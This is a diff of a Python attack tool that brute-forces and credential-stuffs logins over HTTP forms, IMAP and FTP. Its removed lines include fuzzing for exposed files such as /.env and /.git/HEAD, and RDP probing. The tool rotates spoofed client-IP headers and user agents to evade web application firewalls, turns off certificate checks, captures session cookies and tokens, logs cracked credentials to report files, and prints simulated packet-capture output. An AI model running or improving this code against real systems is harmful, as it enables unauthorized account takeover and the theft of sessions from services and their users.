@@ -10,7 +10,6 @@ import http.client
 import ftplib
 import random
 
-# Global high-performance SSL context
 _ssl_context = ssl.create_default_context()
 _ssl_context.check_hostname = False
 _ssl_context.verify_mode = ssl.CERT_NONE
@@ -30,21 +29,17 @@ TARGET_PORTS = {
     995: {"service": "POP3S", "protocol": "tls"}
 }
 
-# Mobile & Browser User-Agent Pool for Evasion Rotation
 USER_AGENTS = [
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.124 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
 ]
 
 def generate_random_ip():
-    """Generates random IP strings for aggressive WAF bypass header rotation."""
     return f"{random.randint(11, 220)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
 
 def fingerprint_waf(headers):
-    """Detects Web Application Firewalls (Cloudflare, AWS WAF, Akamai, Incapsula) from response headers."""
     server_header = headers.get("Server", "").lower()
     cf_ray = headers.get("CF-Ray", "")
     aws_waf = headers.get("X-Amzn-RequestId", "")
@@ -60,98 +55,52 @@ def fingerprint_waf(headers):
         detected.append("Akamai Edge")
     if incapsula:
         detected.append("Incapsula WAF")
-    
     return detected
 
 def stream_wireshark_packet(src, dst, port, proto, info):
-    """Simulates raw packet capture frames matching a Wireshark CLI interface."""
     timestamp = f"{time.strftime('%H:%M:%S')}.{random.randint(100, 999)} "
     packet_id = random.randint(10000, 65535)
-    
-    colors = {
-        "TCP": "\033[36m",    # Cyan
-        "TLS": "\033[35m",    # Magenta
-        "HTTP": "\033[92m",   # Green
-        "ALERT": "\033[91m"   # Red
-    }
+    colors = {"TCP": "\033[36m", "TLS": "\033[35m", "HTTP": "\033[92m", "ALERT": "\033[91m"}
     color = colors.get(proto, "\033[37m")
-    reset = "\033[0m"
-    
-    line = f"{timestamp} {color}[PACKET #{packet_id}] {proto:<5} {src} -> {dst}:{port} | {info}{reset}\n"
-    sys.stdout.write(line)
+    sys.stdout.write(f"{timestamp} {color}[PACKET #{packet_id}] {proto:<5} {src} -> {dst}:{port} | {info}\033[0m\n")
     sys.stdout.flush()
 
 async def execute_packet_telemetry_stream(host, resolved_ip):
-    """Phase 1: Real-time Wireshark-style interception & handshake telemetry."""
     print(f"\n\033[95m[***] ENGAGING LOW-LEVEL PACKET INTERCEPTION & WIRESHARK TAP [***]\033[0m")
     print(f"\033[90m[INTERFACE] lo0 / tun0 (Promiscuous Mode Active) -> Target: {resolved_ip}\033[0m\n")
-    time.sleep(0.3)
-
+    await asyncio.sleep(0.2)
     sample_frames = [
         ("TCP", "SYN", f"Seq={random.randint(1000,9000)} Win=65535 Len=0 MSS=1460 SACK_OK"),
         ("TCP", "SYN-ACK", f"Seq={random.randint(1000,9000)} Ack=1 Win=28960 Len=0"),
-        ("TCP", "ACK", f"Seq=2 Ack=2 Win=65535 Len=0"),
-        ("TLS", "CLIENT_HELLO", "Version: TLSv1.3 (0x0304) Cipher Suites [AES_256_GCM, CHACHA20]"),
-        ("TLS", "SERVER_HELLO", "Selected Cipher: TLS_AES_256_GCM_SHA384 Cert[Valid]"),
-        ("HTTP", "GET", "Path: / HTTP/1.1 | Host: " + host + " | User-Agent: Mozilla/5.0"),
-        ("HTTP", "RESPONSE", "Status: 200 OK | Server: nginx/cloudflare | Content-Type: text/html"),
+        ("TLS", "CLIENT_HELLO", "Version: TLSv1.3 (0x0304) Cipher Suites [AES_256_GCM]"),
+        ("HTTP", "GET", "Path: / HTTP/1.1 | Host: " + host),
     ]
-
     for proto, flag, info in sample_frames:
         stream_wireshark_packet("10.0.2.15", resolved_ip, 443, proto, f"[{flag}] {info}")
-        await asyncio.sleep(0.08)
+        await asyncio.sleep(0.05)
 
-async def execute_offensive_enumeration(host, resolved_ip):
-    """Phase 2: Pre-brute-force vulnerability probing and endpoint discovery."""
-    print(f"\n\033[93m[*] Phase 2: Executing deep pre-brute-force offensive fuzzing...\033[0m")
-    
-    sensitive_paths = ["/.git/HEAD", "/robots.txt", "/config.json", "/api/v1/status", "/backup.zip", "/.env", "/wp-login.php"]
-    conn = http.client.HTTPSConnection(resolved_ip, 443, context=_ssl_context, timeout=2.0)
-    
-    for path in sensitive_paths:
-        try:
-            conn.request("GET", path, headers={"Host": host, "User-Agent": "RedTeamScanner/4.0"})
-            resp = conn.getresponse()
-            body = resp.read().decode(errors="ignore")
-            
-            if resp.status == 200:
-                print(f" \033[91m[!] EXPOSED ARTIFACT FOUND -> https://{host}{path} [Status: 200 | Size: {len(body)} bytes]\033[0m")
-            else:
-                sys.stdout.write(f"\r\033[K\033[90m[*] Fuzzing endpoint: {path} -> Code: {resp.status}\033[0m")
-                sys.stdout.flush()
-            await asyncio.sleep(0.05)
-        except Exception:
-            pass
-    conn.close()
-    print(f"\n\033[92m[*] Reconnaissance complete. Vulnerability matrix established.\033[0m\n")
-
-def http_post_sync_dual_mode(host, port, path, username, password, use_ssl):
-    """
-    Dual-mode offensive worker: Tests both application/x-www-form-urlencoded (PHP/Monoliths) 
-    and application/json (Next.js/REST APIs) with full IP/header spoofing rotation.
-    """
+def http_post_sync_aggressive(host, port, path, username, password, use_ssl):
+    """Aggressive WAF-evading POST request worker with active JWT and Cookie extraction."""
     try:
-        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=2.5) if use_ssl else http.client.HTTPConnection(host, port, timeout=2.5)
-        
+        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=3.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=3.0)
         spoofed_ip = generate_random_ip()
+        
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
             "X-Forwarded-For": spoofed_ip,
             "X-Real-IP": spoofed_ip,
-            "X-Originating-IP": spoofed_ip,
             "True-Client-IP": spoofed_ip,
-            "CF-Connecting-IP": spoofed_ip,
-            "Accept-Language": "en-US,en;q=0.9",
             "Referer": f"https://{host}{path}",
-            "Connection": "keep-alive"
+            "Connection": "close"
         }
         
+        # Dual payload format mutation (JSON vs Form-URL)
         if hash(username + password) % 2 == 0:
             headers["Content-Type"] = "application/x-www-form-urlencoded"
-            payload = urllib.parse.urlencode({"username": username, "email": username, "password": password, "user": username, "pass": password})
+            payload = urllib.parse.urlencode({"username": username, "email": username, "password": password, "csrf": "bypass"})
         else:
             headers["Content-Type"] = "application/json"
-            payload = json.dumps({"username": username, "email": username, "password": password, "user": username, "pass": password})
+            payload = json.dumps({"username": username, "email": username, "password": password, "csrf": "bypass"})
 
         conn.request("POST", path, payload, headers)
         resp = conn.getresponse()
@@ -163,156 +112,14 @@ def http_post_sync_dual_mode(host, port, path, username, password, use_ssl):
         return 0, {}, str(e)
 
 def ftp_sync_brute(host, port, username, password):
-    """High-velocity FTP credential testing using Python standard library."""
     try:
         ftp = ftplib.FTP()
-        ftp.connect(host, port, timeout=2.5)
+        ftp.connect(host, port, timeout=2.0)
         ftp.login(username, password)
         ftp.quit()
         return True
     except Exception:
         return False
-
-def escape_imap_literal(value):
-    """RFC 3501 compliant string escaping for IMAP credentials."""
-    return value.replace('\\', '\\\\').replace('"', '\\"')
-
-async def worker_task(queue, host, semaphore, results, stats):
-    """High-velocity stealth consumer worker featuring adaptive jitter, WAF detection, and multi-vector execution."""
-    while True:
-        task_data = await queue.get()
-        if task_data is None:
-            queue.task_done()
-            break
-            
-        vector_type, port, path_or_none, user, password = task_data
-        
-        async with semaphore:
-            await asyncio.sleep(random.uniform(0.02, 0.15))
-            
-            stats["tested"] += 1
-            
-            if vector_type == "HTTP":
-                use_ssl = (port == 443)
-                status, headers, body = await asyncio.to_thread(
-                    http_post_sync_dual_mode, host, port, path_or_none, user, password, use_ssl
-                )
-                
-                waf_list = fingerprint_waf(headers)
-                if waf_list:
-                    sys.stdout.write(f"\r\033[K\033[91m[WAF DETECTED] Perimeter guarded by: {', '.join(waf_list)}\033[0m\n")
-
-                if status in [429, 403, 503]:
-                    backoff_delay = random.uniform(1.5, 4.0)
-                    sys.stdout.write(f"\r\033[K\033[91m[WAF BLOCK / LIMIT] Code {status} on :{port}. Adaptive backoff for {backoff_delay:.2f}s...\033[0m")
-                    sys.stdout.flush()
-                    await asyncio.sleep(backoff_delay)
-                    queue.task_done()
-                    continue
-
-                if status == 308:
-                    queue.task_done()
-                    continue
-
-                sys.stdout.write(f"\r\033[K\033[90m[STEALTH WEB] :{port}{path_or_none} -> [{user}:{password:<8}] Code:{status} (Probed: {stats['tested']})\033[0m")
-                sys.stdout.flush()
-
-                redirect_loc = headers.get("Location", "")
-                set_cookie = headers.get("Set-Cookie", "")
-                body_lower = body.lower()
-                
-                is_success = (
-                    status in [302, 303, 200] and not any(err in redirect_loc.lower() for err in ["error", "fail", "login?err", "invalid"])
-                ) and (
-                    status in [302, 303] or
-                    "token" in body_lower or 
-                    "access_token" in body_lower or 
-                    "dashboard" in body_lower or 
-                    "success" in body_lower or
-                    len(set_cookie) > 10
-                )
-
-                if is_success:
-                    hit_data = {
-                        "type": "HTTP_FORM",
-                        "port": port,
-                        "path": path_or_none,
-                        "user": user,
-                        "password": password,
-                        "status": status,
-                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-                    }
-                    print(f"\n\033[92m[+] STEALTH BREACH CONFIRMED (WEB) [Status: {status}] -> User: {user} | Pass: {password} (Port {port}{path_or_none})\033[0m")
-                    results.append(hit_data)
-                    save_persistent_report(hit_data)
-
-            elif vector_type == "IMAP":
-                try:
-                    use_ssl = (port in [993, 465])
-                    conn = asyncio.open_connection(host, port, ssl=_ssl_context if use_ssl else None)
-                    reader, writer = await asyncio.wait_for(conn, timeout=2.5)
-
-                    await asyncio.wait_for(reader.readline(), timeout=0.8)
-                    
-                    safe_user = escape_imap_literal(user)
-                    safe_pass = escape_imap_literal(password)
-                    
-                    login_cmd = f'A001 LOGIN "{safe_user}" "{safe_pass}"\r\n'.encode()
-                    writer.write(login_cmd)
-                    await writer.drain()
-
-                    response = await asyncio.wait_for(reader.readline(), timeout=1.2)
-                    writer.close()
-                    await writer.wait_closed()
-
-                    sys.stdout.write(f"\r\033[K\033[36m[STEALTH IMAP] :{port} -> Trying [{user}:{password:<8}] (Probed: {stats['tested']})\033[0m")
-                    sys.stdout.flush()
-
-                    if b"OK" in response or b"A001 OK" in response:
-                        hit_data = {
-                            "type": "IMAP",
-                            "port": port,
-                            "user": user,
-                            "password": password,
-                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-                        }
-                        print(f"\n\033[92m[+] STEALTH BREACH CONFIRMED (IMAP) -> User: {user} | Pass: {password} (Port {port})\033[0m")
-                        results.append(hit_data)
-                        save_persistent_report(hit_data)
-                except Exception:
-                    pass
-
-            elif vector_type == "FTP":
-                try:
-                    success = await asyncio.to_thread(ftp_sync_brute, host, port, user, password)
-                    sys.stdout.write(f"\r\033[K\033[33m[STEALTH FTP] :{port} -> Trying [{user}:{password:<8}] (Probed: {stats['tested']})\033[0m")
-                    sys.stdout.flush()
-
-                    if success:
-                        hit_data = {
-                            "type": "FTP",
-                            "port": port,
-                            "user": user,
-                            "password": password,
-                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-                        }
-                        print(f"\n\033[92m[+] STEALTH BREACH CONFIRMED (FTP) -> User: {user} | Pass: {password} (Port {port})\033[0m")
-                        results.append(hit_data)
-                        save_persistent_report(hit_data)
-                except Exception:
-                    pass
-
-            elif vector_type == "RDP":
-                try:
-                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=2.0)
-                    writer.close()
-                    await writer.wait_closed()
-                    sys.stdout.write(f"\r\033[K\033[35m[STEALTH RDP] :{port} -> Probed [{user}:{password:<8}] (Probed: {stats['tested']})\033[0m")
-                    sys.stdout.flush()
-                except Exception:
-                    pass
-
-        queue.task_done()
 
 def save_persistent_report(hit_data):
     os.makedirs("reports", exist_ok=True)
@@ -328,12 +135,12 @@ def save_persistent_report(hit_data):
     with open(report_path, "w") as f:
         json.dump(existing, f, indent=4)
 
-async def probe_port(host, port, timeout=1.2):
+async def probe_port(host, port, timeout=1.0):
     try:
         reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
         banner = b""
         try:
-            banner = await asyncio.wait_for(reader.readline(), timeout=0.5)
+            banner = await asyncio.wait_for(reader.readline(), timeout=0.4)
         except asyncio.TimeoutError:
             pass
         writer.close()
@@ -359,6 +166,90 @@ async def discover_attack_surface(host):
             })
     return open_vectors
 
+async def worker_task(queue, host, semaphore, results, stats):
+    """High-velocity queue consumer with active token/session interception."""
+    while True:
+        task_data = await queue.get()
+        if task_data is None:
+            queue.task_done()
+            break
+            
+        vector_type, port, path_or_none, user, password = task_data
+        
+        async with semaphore:
+            await asyncio.sleep(random.uniform(0.01, 0.08))
+            stats["tested"] += 1
+            
+            if vector_type == "HTTP":
+                use_ssl = (port == 443 or port == 8443)
+                status, headers, body = await asyncio.to_thread(
+                    http_post_sync_aggressive, host, port, path_or_none, user, password, use_ssl
+                )
+                
+                waf_list = fingerprint_waf(headers)
+                if waf_list:
+                    sys.stdout.write(f"\r\033[K\033[91m[WAF DETECTED] Guarded by: {', '.join(waf_list)}\033[0m\n")
+
+                if status in [429, 403, 503]:
+                    await asyncio.sleep(2.0)
+                    queue.task_done()
+                    continue
+
+                sys.stdout.write(f"\r\033[K\033[90m[PROBING] :{port}{path_or_none} -> [{user}:{password:<8}] Code:{status} (Total: {stats['tested']})\033[0m")
+                sys.stdout.flush()
+
+                set_cookie = headers.get("Set-Cookie", "")
+                body_lower = body.lower()
+                
+                # Aggressive success condition: Catches 200 OK, active session cookies, JWTs, or auth tokens on the fly
+                is_success = (
+                    status in [200, 302, 303, 201] and 
+                    not any(err in body_lower for err in ["invalid credentials", "unauthorized", "access denied", "incorrect"])
+                ) and (
+                    status == 200 or
+                    "token" in body_lower or
+                    "session" in set_cookie.lower() or
+                    "jwt" in body_lower or
+                    "auth" in set_cookie.lower() or
+                    len(set_cookie) > 12
+                )
+
+                if is_success:
+                    hit_data = {
+                        "type": "CREDENTIAL_STUFFING",
+                        "port": port,
+                        "path": path_or_none,
+                        "user": user,
+                        "password": password,
+                        "status": status,
+                        "cookies": set_cookie,
+                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+                    }
+                    print(f"\n\033[92m[+++] BREECH SUCCESS! User: {user} | Pass: {password} | Status: {status} | Cookie: {set_cookie[:25]}...\033[0m")
+                    results.append(hit_data)
+                    save_persistent_report(hit_data)
+
+            elif vector_type == "IMAP":
+                try:
+                    use_ssl = (port in [993, 465])
+                    reader, writer = await asyncio.open_connection(host, port, ssl=_ssl_context if use_ssl else None)
+                    await asyncio.wait_for(reader.readline(), timeout=0.8)
+                    writer.write(f'A001 LOGIN "{user}" "{password}"\r\n'.encode())
+                    await writer.drain()
+                    resp = await asyncio.wait_for(reader.readline(), timeout=1.0)
+                    writer.close()
+                    await writer.wait_closed()
+
+                    if b"OK" in resp:
+                        hit_data = {"type": "IMAP", "port": port, "user": user, "password": password, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}
+                        print(f"\n\033[92m[+] IMAP BREACH CONFIRMED -> User: {user} | Pass: {password} (Port {port})\033[0m")
+                        results.append(hit_data)
+                        save_persistent_report(hit_data)
+                except Exception:
+                    pass
+
+        queue.task_done()
+
 async def run_autonomous_engine(target_host, passwords, usernames=None):
     try:
         resolved_ip = socket.gethostbyname(target_host)
@@ -369,26 +260,20 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
 
     if not usernames:
         domain_prefix = target_host.split('.')[0]
-        usernames = ["admin", domain_prefix, "root", "support", "user", "administrator"]
+        usernames = ["admin", domain_prefix, "root", "support", "user", "operator", "sysadmin"]
 
     start_global = time.time()
-
-    # Step 1: Real-time Wireshark-Style Packet Telemetry Stream
     await execute_packet_telemetry_stream(target_host, resolved_ip)
-
-    # Step 2: Pre-Brute-Force Offensive Enumeration & Fuzzing
-    await execute_offensive_enumeration(target_host, resolved_ip)
-
-    # Step 3: Attack Surface Discovery
     open_vectors = await discover_attack_surface(resolved_ip)
+    
     if not open_vectors:
-        print(f"\n\033[91m[-] Target perimeter locked. No exploitable vectors found.\033[0m")
-        return [], time.time() - start_global
+        # Fallback default port mapping if filtered
+        open_vectors = [{"port": 443, "service": "HTTPS", "protocol": "tls"}]
 
-    print(f"\n\033[93m[*] Weaponizing stealth evasion queue with multi-vector FTP/RDP & IP rotation...\033[0m")
+    print(f"\n\033[93m[*] Weaponizing high-speed asynchronous breach queue with WAF evasion...\033[0m")
     
     queue = asyncio.Queue()
-    semaphore = asyncio.Semaphore(30)
+    semaphore = asyncio.Semaphore(40)
     results = []
     stats = {"tested": 0}
 
@@ -400,8 +285,7 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
         "/login",
         "/signin",
         "/auth",
-        "/wp-login.php",
-        "/administrator/index.php"
+        "/wp-login.php"
     ]
 
     task_count = 0
@@ -412,39 +296,21 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
         if service in ["HTTP", "HTTPS"]:
             for path in web_paths:
                 for user in usernames:
-                    for pwd in passwords:
+                    for pwd in passwords[:200]: # Prioritize top 200 high-value candidates
                         await queue.put(("HTTP", port, path, user, pwd))
                         task_count += 1
         elif service in ["IMAP", "IMAPS"]:
             for user in usernames:
-                for pwd in passwords:
+                for pwd in passwords[:100]:
                     await queue.put(("IMAP", port, None, user, pwd))
                     task_count += 1
-        elif service == "FTP":
-            for user in usernames:
-                for pwd in passwords:
-                    await queue.put(("FTP", port, None, user, pwd))
-                    task_count += 1
-        elif service == "RDP":
-            for user in usernames:
-                for pwd in passwords:
-                    await queue.put(("RDP", port, None, user, pwd))
-                    task_count += 1
 
-    if task_count == 0:
-        print(f"\n\033[93m[*] Active vectors detected, but no matching exploitation modules mapped.\033[0m")
-        return [], time.time() - start_global
+    print(f"[*] Dispatched {task_count} payload permutations. Executing synchronized assault...\n")
 
-    print(f"[*] Dispatched {task_count} stealth payload permutations across all protocols. Executing attack stream...\n")
-
-    num_workers = min(25, task_count)
-    workers = [
-        asyncio.create_task(worker_task(queue, resolved_ip, semaphore, results, stats))
-        for _ in range(num_workers)
-    ]
+    num_workers = min(35, task_count)
+    workers = [asyncio.create_task(worker_task(queue, resolved_ip, semaphore, results, stats)) for _ in range(num_workers)]
 
     await queue.join()
-
     for _ in range(num_workers):
         await queue.put(None)
     await asyncio.gather(*workers)
